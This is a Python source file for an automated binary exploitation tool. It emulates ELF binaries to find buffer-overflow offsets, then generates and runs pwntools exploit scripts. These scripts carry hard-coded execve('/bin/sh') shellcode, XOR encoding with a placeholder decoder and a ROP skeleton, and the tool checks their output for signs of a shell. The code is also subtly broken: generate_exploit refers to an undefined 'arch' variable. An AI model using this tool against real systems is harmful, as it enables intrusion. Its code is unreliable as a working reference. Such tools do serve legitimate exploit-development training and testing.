import os
from typing import Optional, Dict, Tuple
from src.utils.pattern_tools import PatternGenerator
from src.emulation.unicorn_emulator import UnicornEmulator
from src.detectors.checksec_detector import ChecksecDetector
from src.exploitation.payload_encoder import PayloadEncoder
from src.exploitation.polymorphic_engine import PolymorphicEngine
from pwn import ELF

class AutoExploiter:
    """
    Automates binary exploitation tasks:
    1. Finds buffer overflow offsets using cyclic patterns and emulation.
    2. Generates exploit scripts based on binary protections.
    3. Applies payload encoding and polymorphism.
    """

    def __init__(self):
        self.pattern_generator = PatternGenerator()
        self.checksec = ChecksecDetector()
        self.encoder = PayloadEncoder()
        self.polymorph_engine = PolymorphicEngine()

    def find_offset(self, binary_path: str) -> int:
        """
        Find the buffer overflow offset by crashing the binary with a cyclic pattern.
        
        Args:
            binary_path: Path to the binary
            
        Returns:
            Offset integer or -1 if not found
        """
        print(f"[+] Starting find_offset for {binary_path}")
        try:
            # 1. Load binary info using pwntools
            elf = ELF(binary_path, checksec=False)
            arch = 'x86' if elf.arch == 'i386' else 'x64'
            print(f"[+] Detected architecture: {arch}")
            
            # 2. Generate a large pattern
            pattern_len = 4096
            pattern = self.pattern_generator.create(pattern_len)
            
            # 3. Initialize Emulator
            emu = UnicornEmulator(arch=arch)
            
            # 4. Map ELF segments
            print("[+] Mapping ELF segments...")
            for segment in elf.segments:
                if segment.header.p_type == 'PT_LOAD':
                    vaddr = segment.header.p_vaddr
                    memsz = segment.header.p_memsz
                    data = segment.data()
                    
                    # Align to 4KB page size
                    aligned_vaddr = vaddr & ~0xFFF
                    aligned_size = ((vaddr + memsz + 0xFFF) & ~0xFFF) - aligned_vaddr
                    
                    try:
                        emu.uc.mem_map(aligned_vaddr, aligned_size)
                        print(f"    Mapped 0x{aligned_vaddr:x} - 0x{aligned_vaddr+aligned_size:x}")
                    except Exception:
                        pass 
                        
                    emu.uc.mem_write(vaddr, data)

            # 5. Setup Stack (handled by UnicornEmulator init)
            
            # 6. Hook PLT entries
            print("[+] Hooking PLT functions...")
            self._hook_plt_functions(emu, elf, pattern)
            # 7. Run emulation
            # Try to find main
            start_addr = elf.entry
            
            # Debug symbols
            # print(f"[DEBUG] Symbols: {list(elf.symbols.keys())[:20]}...")
            
            if 'main' in elf.symbols:
                start_addr = elf.symbols['main']
                print(f"[+] Found main at 0x{start_addr:x}, starting emulation there")
                self._setup_stack_for_main(emu, arch)
            elif '__libc_start_main' in elf.plt:
                print(f"[+] main not found, hooking __libc_start_main at 0x{elf.plt['__libc_start_main']:x}")
                # We start at entry, and let it run until it hits __libc_start_main
                # Then we redirect to main
                self._hook_libc_start_main(emu, elf)
            else:
                print(f"[+] main symbol not found and no __libc_start_main in PLT. Starting at entry: 0x{start_addr:x}")
            
            emu.set_input(pattern.encode())
            
            result = emu.emulate(start_addr=start_addr, count=500000)
            
            # 8. Check for crash
            if not result.success:
                print(f"[!] Emulation finished with error: {result.error}")
                if result.error_address:
                    print(f"[!] Error address: 0x{result.error_address:x}")
                
                regs = result.final_registers
                pc_reg = 'rip' if arch == 'x64' else 'eip'
                pc = regs.get(pc_reg, 0)
                print(f"[!] Crash PC ({pc_reg}): 0x{pc:x}")
                
                # Check PC overwrite
                pc_hex = f"0x{pc:x}"
                offset = self.pattern_generator.offset(pc_hex)
                
                if offset != -1:
                    print(f"[+] Found offset via PC overwrite: {offset}")
                    return offset
                
                # Check Stack overwrite (saved RET)
                print("[*] Checking stack for pattern...")
                sp_reg = 'rsp' if arch == 'x64' else 'esp'
                sp = regs.get(sp_reg, 0)
                
                # Read some stack memory
                try:
                    stack_data = emu.uc.mem_read(sp, 32)
                    print(f"    Stack at crash: {stack_data.hex()}")
                    
                    # Try to find pattern in stack
                    # If we are at RET, SP points to return address.
                    # If that return address is our pattern, we found it.
                    ret_val = int.from_bytes(stack_data[:(8 if arch=='x64' else 4)], 'little')
                    ret_hex = f"0x{ret_val:x}"
                    offset = self.pattern_generator.offset(ret_hex)
                    if offset != -1:
                        print(f"[+] Found offset via Stack (RET addr): {offset}")
                        return offset
                except Exception as e:
                    print(f"[-] Error reading stack: {e}")

            else:
                print("[-] Emulation finished successfully (no crash).")
                
        except Exception as e:
            print(f"[-] Error finding offset: {e}")
            import traceback
            traceback.print_exc()
            
        return -1

    def _setup_stack_for_main(self, emu, arch):
        if arch == 'x64':
            sp = emu.uc.reg_read(59) # RSP
            emu.uc.mem_write(sp - 8, b'\xef\xbe\xad\xde\xef\xbe\xad\xde') # 0xdeadbeefdeadbeef
            emu.uc.reg_write(59, sp - 8)
        else:
            sp = emu.uc.reg_read(20) # ESP
            emu.uc.mem_write(sp - 4, b'\xef\xbe\xad\xde') # 0xdeadbeef
            emu.uc.reg_write(20, sp - 4)

    def _hook_libc_start_main(self, emu, elf):
        from unicorn import UC_HOOK_CODE
        from unicorn.x86_const import UC_X86_REG_RDI, UC_X86_REG_ESP
        
        def libc_start_main_handler(uc, address, size, user_data):
            print(f"[!] Hit __libc_start_main at 0x{address:x}")
            # Extract main address
            # x64: RDI
            # x86: Stack (ESP) -> [ESP] is ret, [ESP+4] is main
            
            main_addr = 0
            if emu.arch == 'x64':
                main_addr = uc.reg_read(UC_X86_REG_RDI)
            else:
                esp = uc.reg_read(UC_X86_REG_ESP)
                # Arguments are pushed before call.
                # When we are at the hook (PLT entry), we haven't executed the jump yet?
                # Wait, we hook the PLT address.
                # If we are at PLT start:
                # x86 calling convention: arguments on stack.
                # [ESP] = return address (pushed by call _start->PLT? No, _start calls PLT)
                # So [ESP] is return to _start.
                # [ESP+4] is 1st arg (main)
                try:
                    main_addr = int.from_bytes(uc.mem_read(esp + 4, 4), 'little')
                except:
                    print("[-] Failed to read main addr from stack")
            
            print(f"[+] Extracted main address: 0x{main_addr:x}")
            
            if main_addr != 0:
                # We want to run main.
                # We can just jump to it?
                # But we need to setup stack frame?
                # Let's just set PC to main and setup return address to deadbeef
                
                # Setup return address
                self._setup_stack_for_main(emu, emu.arch)
                
                # Set PC to main
                if emu.arch == 'x64':
                    uc.reg_write(55, main_addr) # RIP
                else:
                    uc.reg_write(16, main_addr) # EIP
                    
                print(f"[+] Redirecting execution to main at 0x{main_addr:x}")

        addr = elf.plt['__libc_start_main']
        emu.uc.hook_add(UC_HOOK_CODE, libc_start_main_handler, begin=addr, end=addr)

    def _hook_plt_functions(self, emu, elf, pattern):
        """Hook common PLT functions to simulate input/output"""
        try:
            from unicorn import UC_HOOK_CODE
            from unicorn.x86_const import (
                UC_X86_REG_RDI, UC_X86_REG_RSI, UC_X86_REG_RDX,
                UC_X86_REG_ESP, UC_X86_REG_EIP,
                UC_X86_REG_RSP, UC_X86_REG_RIP
            )

            # Handler for gets(buf)
            def gets_handler(uc, address, size, user_data):
                # Read arg0 (buffer)
                if emu.arch == 'x64':
                    buf = uc.reg_read(UC_X86_REG_RDI)
                else:
                    # x86: args on stack. ESP points to return addr. ESP+4 is arg0.
                    esp = uc.reg_read(UC_X86_REG_ESP)
                    buf = int.from_bytes(uc.mem_read(esp + 4, 4), 'little')
                
                # Write pattern to buffer
                try:
                    uc.mem_write(buf, pattern.encode() + b'\n')
                except Exception:
                    pass
                
                # Simulate return
                self._simulate_ret(uc, emu.arch)

            # Handler for read(fd, buf, size)
            def read_handler(uc, address, size, user_data):
                if emu.arch == 'x64':
                    buf = uc.reg_read(UC_X86_REG_RSI)
                else:
                    esp = uc.reg_read(UC_X86_REG_ESP)
                    buf = int.from_bytes(uc.mem_read(esp + 8, 4), 'little')
                
                try:
                    uc.mem_write(buf, pattern.encode())
                except Exception:
                    pass
                    
                self._simulate_ret(uc, emu.arch)
            
            # Generic handler for other functions (skip them)
            def generic_skip_handler(uc, address, size, user_data):
                self._simulate_ret(uc, emu.arch)

            # Hook ALL PLT functions
            for name, addr in elf.plt.items():
                if name == 'gets':
                    print(f"    Hooking gets at 0x{addr:x}")
                    emu.uc.hook_add(UC_HOOK_CODE, gets_handler, begin=addr, end=addr)
                elif name == 'read' or name == '__isoc99_scanf':
                    print(f"    Hooking {name} at 0x{addr:x}")
                    emu.uc.hook_add(UC_HOOK_CODE, read_handler, begin=addr, end=addr)
                elif name == '__libc_start_main':
                    # Already handled or ignored here? 
                    # If we hooked it in find_offset, we shouldn't overwrite it.
                    # But find_offset calls this method.
                    # Let's ignore it here if we handle it specially, OR just let it be skipped if not special.
                    # But wait, find_offset logic hooks it BEFORE calling this?
                    # No, find_offset calls this method.
                    # If we hook it here as 'skip', it might break the dynamic main finding if that logic is active.
                    # But dynamic main finding is done via a separate hook added in find_offset.
                    # If we add another hook here, both might run? Or one?
                    # Unicorn allows multiple hooks.
                    pass 
                else:
                    # Generic skip for printf, puts, etc.
                    print(f"    Hooking generic skip for {name} at 0x{addr:x}")
                    emu.uc.hook_add(UC_HOOK_CODE, generic_skip_handler, begin=addr, end=addr, user_data=name)

        except Exception as e:
            print(f"[-] Hooking error: {e}")

    def _simulate_ret(self, uc, arch):
        """Simulate a return instruction"""
        from unicorn.x86_const import (
            UC_X86_REG_ESP, UC_X86_REG_EIP,
            UC_X86_REG_RSP, UC_X86_REG_RIP
        )
        if arch == 'x64':
            rsp = uc.reg_read(UC_X86_REG_RSP)
            ret_addr = int.from_bytes(uc.mem_read(rsp, 8), 'little')
            uc.reg_write(UC_X86_REG_RSP, rsp + 8)
            uc.reg_write(UC_X86_REG_RIP, ret_addr)
        else:
            esp = uc.reg_read(UC_X86_REG_ESP)
            ret_addr = int.from_bytes(uc.mem_read(esp, 4), 'little')
            uc.reg_write(UC_X86_REG_ESP, esp + 4)
            uc.reg_write(UC_X86_REG_EIP, ret_addr)

    def generate_exploit(self, binary_path: str, offset: int, use_encoding: bool = False, use_polymorph: bool = False) -> str:
        """
        Generate a Python exploit script using pwntools.
        
        Args:
            binary_path: Path to the binary
            offset: Buffer overflow offset
            use_encoding: Enable payload encoding
            use_polymorph: Enable polymorphic mutation
            
        Returns:
            Python script content
        """
        # 2. Determine strategy based on mitigations
        from src.detectors.checksec_detector import ChecksecDetector
        checksec = ChecksecDetector()
        mitigations = checksec.check_security(binary_path)
        
        nx = mitigations.get('NX', 'Unknown') == 'Enabled'
        pie = mitigations.get('PIE', 'Unknown') == 'Enabled'       
        script = []
        script.append("from pwn import *")
        script.append("")
        script.append(f"# Binary: {os.path.basename(binary_path)}")
        script.append(f"# Offset: {offset}")
        script.append(f"# Protections: NX={nx}, PIE={pie}")
        script.append("")
        script.append(f"exe = '{binary_path}'")  # Use absolute path
        script.append("elf = context.binary = ELF(exe, checksec=False)")
        script.append("")
        script.append("# Start process")
        script.append("io = process(exe)")
        script.append("")
        
        if not nx:
            # Strategy: ret2shellcode
            script.append("# Strategy: ret2shellcode (NX Disabled)")
            script.append("# We can execute shellcode on the stack")
            script.append("")
            script.append(f"offset = {offset}")
            
            # Use pre-compiled shellcode to avoid needing cross-arch assemblers
            if arch == 'i386': # pwntools uses 'i386' for x86
                script.append("# x86 execve('/bin/sh') shellcode (23 bytes)")
                script.append("shellcode = b'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'")
            else:  # x64
                script.append("# x64 execve('/bin/sh') shellcode (27 bytes)")
                script.append("shellcode = b'\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05'")
            
            if use_polymorph:
                script.append("")
                script.append("# Apply Polymorphism")
                script.append("shellcode = b'\\x90'*16 + shellcode # NOP sled")
            
            if use_encoding:
                script.append("")
                script.append("# Apply Encoding (XOR)")
                script.append("key = 0xAA")
                script.append("shellcode = xor(shellcode, key)")
                script.append("# Note: You need a decoder stub if you encode the shellcode!")
                script.append("# For this demo, we assume the target can execute the encoded payload directly (unlikely) or we need to add a decoder.")
                script.append("# Adding simple x64 decoder stub:")
                script.append("# (This is a placeholder for the actual decoder generation logic)")
                script.append("decoder = asm('''")
                script.append("    lea rsi, [rip+14]")
                script.append("    mov rcx, 100")
                script.append("loop:")
                script.append("    xor byte ptr [rsi], 0xAA")
                script.append("    inc rsi")
                script.append("    loop loop")
                script.append("''')")
                script.append("shellcode = decoder + shellcode")

            script.append("")
            script.append("# Payload: Padding + Address of Shellcode + Shellcode")
            script.append("# Note: You need to find the address of the buffer (stack leak or static)")
            script.append("# Assuming we jump to stack (JMP ESP/RSP gadget needed usually)")
            script.append("payload = flat({")
            script.append("    offset: shellcode")
            script.append("})")
            
        else:
            # Strategy: ROP
            script.append("# Strategy: ROP (NX Enabled)")
            script.append("# We need to build a ROP chain")
            script.append("")
            script.append(f"offset = {offset}")
            script.append("rop = ROP(elf)")
            script.append("# Example: rop.call(elf.symbols['puts'], [elf.got['puts']])")
            script.append("# rop.call(elf.symbols['main'])")
            script.append("")
            script.append("payload = flat({")
            script.append("    offset: rop.chain()")
            script.append("})")
            
        script.append("")
        script.append("io.sendline(payload)")
        script.append("io.interactive()")
        
        return "\n".join(script)
    
    def execute_exploit(self, binary_path: str, script_content: str, timeout: int = 10) -> dict:
        """
        Execute the generated exploit script and capture output.
        
        Args:
            binary_path: Path to the target binary
            script_content: The exploit script to execute
            timeout: Timeout in seconds
            
        Returns:
            Dictionary with execution results
        """
        import tempfile
        import subprocess
        
        result = {
            'success': False,
            'output': '',
            'error': '',
            'shell_obtained': False
        }
        
        try:
            # Write script to temporary file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                script_path = f.name
                f.write(script_content)
            
            # Execute the script
            print(f"[+] Executing exploit script...")
            proc = subprocess.Popen(
                ['python3', script_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                text=True
            )
            
            try:
                stdout, stderr = proc.communicate(timeout=timeout)
                result['output'] = stdout
                result['error'] = stderr
                result['success'] = True
                
                # Check if we got a shell (look for common indicators)
                if any(indicator in stdout.lower() for indicator in ['$', '#', 'sh-', 'bash-', 'uid=']):
                    result['shell_obtained'] = True
                    print("[+] Shell obtained!")
                else:
                    print("[*] Exploit executed but shell not confirmed")
                    
            except subprocess.TimeoutExpired:
                proc.kill()
                result['error'] = f"Execution timed out after {timeout} seconds"
                print(f"[-] Execution timed out")
            
            # Cleanup
            os.unlink(script_path)
            
        except Exception as e:
            result['error'] = str(e)
            print(f"[-] Execution error: {e}")
        
        return result
